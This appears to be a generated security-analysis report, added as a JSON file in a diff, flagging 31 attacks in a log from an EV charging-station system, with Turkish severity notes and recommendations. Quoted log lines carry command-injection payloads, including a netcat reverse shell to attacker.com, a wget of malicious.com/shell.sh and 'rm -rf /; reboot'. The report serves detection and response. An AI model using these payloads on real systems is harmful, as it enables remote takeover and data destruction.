@@ -1,0 +1,270 @@
+{
+  "timestamp": "2025-11-05T21:01:11.679236",
+  "total_lines": 500,
+  "attacks_detected": 31,
+  "attacks": [
+    {
+      "type": "COMMAND_INJECTION",
+      "line": 7,
+      "content": "2025-11-04T21:01:36.715297 - WARN EVENT 103 - user=user0164 - command_param=\"| nc -e /bin/bash attacker.com 4444\" - note=possible_injection - ip=192.168.250.226",
+      "details": "Şüpheli komut kalıbı tespit edildi",
+      "severity": "CRITICAL",
+      "immediate_action": "Sistem erişimini kontrol et, güvenlik açığını kapat"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 14,
+      "content": "2025-11-04T21:02:19.715297 - ALERT EVENT 251 - admin_api - set_price station=EVS040 price=2TL/kWh - source=api_key_O9v0************ - ip=198.169.40.250",
+      "details": "Anormal düşük fiyat: 2TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 70,
+      "content": "2025-11-04T21:10:24.715297 - ALERT EVENT 315 - admin_api - set_price station=EVS019 price=3TL/kWh - source=api_key_7PSH************ - ip=196.171.50.219",
+      "details": "Anormal düşük fiyat: 3TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 83,
+      "content": "2025-11-04T21:12:02.715297 - ALERT EVENT 216 - admin_api - set_price station=EVS017 price=5TL/kWh - source=api_key_enRL************ - ip=201.169.103.173",
+      "details": "Anormal düşük fiyat: 5TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "line": 91,
+      "content": "2025-11-04T21:13:22.715297 - WARN EVENT 421 - user=user0190 - command_param=\"| nc -e /bin/bash attacker.com 4444\" - note=possible_injection - ip=193.168.17.192",
+      "details": "Şüpheli komut kalıbı tespit edildi",
+      "severity": "CRITICAL",
+      "immediate_action": "Sistem erişimini kontrol et, güvenlik açığını kapat"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 103,
+      "content": "2025-11-04T21:15:12.715297 - ALERT EVENT 39 - admin_api - set_price station=EVS024 price=3TL/kWh - source=api_key_JVxn************ - ip=193.168.253.165",
+      "details": "Anormal düşük fiyat: 3TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 122,
+      "content": "2025-11-04T21:17:01.715297 - ALERT EVENT 411 - admin_api - set_price station=EVS043 price=4TL/kWh - source=api_key_2rSy************ - ip=197.172.5.191",
+      "details": "Anormal düşük fiyat: 4TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "UNAUTHORIZED_ACCESS",
+      "line": 129,
+      "content": "2025-11-04T21:17:38.715297 - ALERT EVENT 373 - unauthorized_admin_access user=user0081 - privilege_escalation=true - ip=203.172.2.40 - timestamp_anomaly=detected",
+      "details": "Yetkisiz yönetici erişimi",
+      "severity": "CRITICAL",
+      "immediate_action": "Tüm admin oturumlarını sonlandır, şifreleri değiştir"
+    },
+    {
+      "type": "DOS_ATTACK",
+      "line": 133,
+      "content": "2025-11-04T21:18:15.715297 - ERROR EVENT 288 - connection_flood from=194.168.34.13 - requests_per_sec=1730 - status=rate_limit_exceeded",
+      "details": "DoS saldırısı tespit edildi",
+      "severity": "HIGH",
+      "immediate_action": "IP'yi engelle, rate limiting uygula"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 137,
+      "content": "2025-11-04T21:18:31.715297 - ALERT EVENT 166 - admin_api - set_price station=EVS001 price=4TL/kWh - source=api_key_OFoI************ - ip=200.168.199.54",
+      "details": "Anormal düşük fiyat: 4TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "UNAUTHORIZED_ACCESS",
+      "line": 152,
+      "content": "2025-11-04T21:19:58.715297 - ALERT EVENT 73 - unauthorized_admin_access user=user0020 - privilege_escalation=true - ip=197.171.33.187 - timestamp_anomaly=detected",
+      "details": "Yetkisiz yönetici erişimi",
+      "severity": "CRITICAL",
+      "immediate_action": "Tüm admin oturumlarını sonlandır, şifreleri değiştir"
+    },
+    {
+      "type": "DOS_ATTACK",
+      "line": 179,
+      "content": "2025-11-04T21:23:22.715297 - ERROR EVENT 209 - connection_flood from=194.171.56.119 - requests_per_sec=858 - status=rate_limit_exceeded",
+      "details": "DoS saldırısı tespit edildi",
+      "severity": "HIGH",
+      "immediate_action": "IP'yi engelle, rate limiting uygula"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 215,
+      "content": "2025-11-04T21:26:41.715297 - ALERT EVENT 255 - admin_api - set_price station=EVS005 price=5TL/kWh - source=api_key_GmN1************ - ip=195.170.89.164",
+      "details": "Anormal düşük fiyat: 5TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 240,
+      "content": "2025-11-04T21:29:24.715297 - ALERT EVENT 199 - admin_api - set_price station=EVS004 price=4TL/kWh - source=api_key_Wn9F************ - ip=198.168.142.47",
+      "details": "Anormal düşük fiyat: 4TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "line": 250,
+      "content": "2025-11-04T21:30:19.715297 - WARN EVENT 328 - user=user0092 - command_param=\"rm -rf /; reboot\" - note=possible_injection - ip=200.168.255.30",
+      "details": "Şüpheli komut kalıbı tespit edildi",
+      "severity": "CRITICAL",
+      "immediate_action": "Sistem erişimini kontrol et, güvenlik açığını kapat"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 256,
+      "content": "2025-11-04T21:30:43.715297 - ALERT EVENT 432 - admin_api - set_price station=EVS046 price=2TL/kWh - source=api_key_OhAM************ - ip=196.170.94.145",
+      "details": "Anormal düşük fiyat: 2TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "UNAUTHORIZED_ACCESS",
+      "line": 259,
+      "content": "2025-11-04T21:31:10.715297 - ALERT EVENT 385 - unauthorized_admin_access user=user0078 - privilege_escalation=true - ip=194.170.193.96 - timestamp_anomaly=detected",
+      "details": "Yetkisiz yönetici erişimi",
+      "severity": "CRITICAL",
+      "immediate_action": "Tüm admin oturumlarını sonlandır, şifreleri değiştir"
+    },
+    {
+      "type": "UNAUTHORIZED_ACCESS",
+      "line": 301,
+      "content": "2025-11-04T21:37:33.715297 - ALERT EVENT 249 - unauthorized_admin_access user=user0175 - privilege_escalation=true - ip=201.171.212.134 - timestamp_anomaly=detected",
+      "details": "Yetkisiz yönetici erişimi",
+      "severity": "CRITICAL",
+      "immediate_action": "Tüm admin oturumlarını sonlandır, şifreleri değiştir"
+    },
+    {
+      "type": "DOS_ATTACK",
+      "line": 302,
+      "content": "2025-11-04T21:37:38.715297 - ERROR EVENT 34 - connection_flood from=199.170.253.248 - requests_per_sec=1629 - status=rate_limit_exceeded",
+      "details": "DoS saldırısı tespit edildi",
+      "severity": "HIGH",
+      "immediate_action": "IP'yi engelle, rate limiting uygula"
+    },
+    {
+      "type": "UNAUTHORIZED_ACCESS",
+      "line": 376,
+      "content": "2025-11-04T21:47:57.715297 - ALERT EVENT 180 - unauthorized_admin_access user=user0087 - privilege_escalation=true - ip=200.169.110.155 - timestamp_anomaly=detected",
+      "details": "Yetkisiz yönetici erişimi",
+      "severity": "CRITICAL",
+      "immediate_action": "Tüm admin oturumlarını sonlandır, şifreleri değiştir"
+    },
+    {
+      "type": "UNAUTHORIZED_ACCESS",
+      "line": 384,
+      "content": "2025-11-04T21:48:56.715297 - ALERT EVENT 293 - unauthorized_admin_access user=user0162 - privilege_escalation=true - ip=201.172.143.52 - timestamp_anomaly=detected",
+      "details": "Yetkisiz yönetici erişimi",
+      "severity": "CRITICAL",
+      "immediate_action": "Tüm admin oturumlarını sonlandır, şifreleri değiştir"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "line": 387,
+      "content": "2025-11-04T21:49:01.715297 - WARN EVENT 100 - user=user0011 - command_param=\"; python -c \"import os; os.system('id')\"\" - note=possible_injection - ip=197.172.170.126",
+      "details": "Şüpheli komut kalıbı tespit edildi",
+      "severity": "CRITICAL",
+      "immediate_action": "Sistem erişimini kontrol et, güvenlik açığını kapat"
+    },
+    {
+      "type": "PRICE_MANIPULATION",
+      "line": 393,
+      "content": "2025-11-04T21:50:06.715297 - ALERT EVENT 215 - admin_api - set_price station=EVS002 price=3TL/kWh - source=api_key_3CPV************ - ip=202.170.231.135",
+      "details": "Anormal düşük fiyat: 3TL/kWh",
+      "severity": "HIGH",
+      "immediate_action": "Fiyat değişikliklerini geri al, API anahtarlarını kontrol et"
+    },
+    {
+      "type": "UNAUTHORIZED_ACCESS",
+      "line": 411,
+      "content": "2025-11-04T21:51:26.715297 - ALERT EVENT 145 - unauthorized_admin_access user=user0014 - privilege_escalation=true - ip=203.169.180.19 - timestamp_anomaly=detected",
+      "details": "Yetkisiz yönetici erişimi",
+      "severity": "CRITICAL",
+      "immediate_action": "Tüm admin oturumlarını sonlandır, şifreleri değiştir"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "line": 415,
+      "content": "2025-11-04T21:51:58.715297 - WARN EVENT 465 - user=user0111 - command_param=\"; python -c \"import os; os.system('id')\"\" - note=possible_injection - ip=196.171.24.82",
+      "details": "Şüpheli komut kalıbı tespit edildi",
+      "severity": "CRITICAL",
+      "immediate_action": "Sistem erişimini kontrol et, güvenlik açığını kapat"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "line": 420,
+      "content": "2025-11-04T21:52:30.715297 - WARN EVENT 109 - user=user0045 - command_param=\"&& wget malicious.com/shell.sh\" - note=possible_injection - ip=203.172.224.173",
+      "details": "Şüpheli komut kalıbı tespit edildi",
+      "severity": "CRITICAL",
+      "immediate_action": "Sistem erişimini kontrol et, güvenlik açığını kapat"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "line": 435,
+      "content": "2025-11-04T21:53:27.715297 - WARN EVENT 333 - user=user0027 - command_param=\"rm -rf /; reboot\" - note=possible_injection - ip=197.168.196.4",
+      "details": "Şüpheli komut kalıbı tespit edildi",
+      "severity": "CRITICAL",
+      "immediate_action": "Sistem erişimini kontrol et, güvenlik açığını kapat"
+    },
+    {
+      "type": "DOS_ATTACK",
+      "line": 437,
+      "content": "2025-11-04T21:53:35.715297 - ERROR EVENT 83 - connection_flood from=197.169.213.213 - requests_per_sec=886 - status=rate_limit_exceeded",
+      "details": "DoS saldırısı tespit edildi",
+      "severity": "HIGH",
+      "immediate_action": "IP'yi engelle, rate limiting uygula"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "line": 448,
+      "content": "2025-11-04T21:54:34.715297 - WARN EVENT 398 - user=user0044 - command_param=\"&& wget malicious.com/shell.sh\" - note=possible_injection - ip=203.171.150.128",
+      "details": "Şüpheli komut kalıbı tespit edildi",
+      "severity": "CRITICAL",
+      "immediate_action": "Sistem erişimini kontrol et, güvenlik açığını kapat"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "line": 455,
+      "content": "2025-11-04T21:55:54.715297 - WARN EVENT 471 - user=user0136 - command_param=\"rm -rf /; reboot\" - note=possible_injection - ip=197.168.88.72",
+      "details": "Şüpheli komut kalıbı tespit edildi",
+      "severity": "CRITICAL",
+      "immediate_action": "Sistem erişimini kontrol et, güvenlik açığını kapat"
+    },
+    {
+      "type": "UNAUTHORIZED_ACCESS",
+      "line": 462,
+      "content": "2025-11-04T21:56:34.715297 - ALERT EVENT 436 - unauthorized_admin_access user=user0159 - privilege_escalation=true - ip=200.170.61.11 - timestamp_anomaly=detected",
+      "details": "Yetkisiz yönetici erişimi",
+      "severity": "CRITICAL",
+      "immediate_action": "Tüm admin oturumlarını sonlandır, şifreleri değiştir"
+    }
+  ],
+  "risk_level": "CRITICAL",
+  "recommendations": [
+    "Input validation kurallarını sıkılaştır",
+    "Web application firewall (WAF) kur",
+    "Sistem güncellemelerini kontrol et",
+    "API anahtarı yetkilendirmelerini gözden geçir",
+    "Fiyat değişiklik onay süreçleri ekle",
+    "Mali işlem auditini başlat",
+    "DDoS koruması aktif et",
+    "Rate limiting ayarlarını optimize et",
+    "CDN ve load balancer kullan",
+    "Multi-factor authentication zorunlu kıl",
+    "Kullanıcı erişim haklarını yeniden değerlendir",
+    "Sistem güvenlik auditini yap"
+  ]
+}
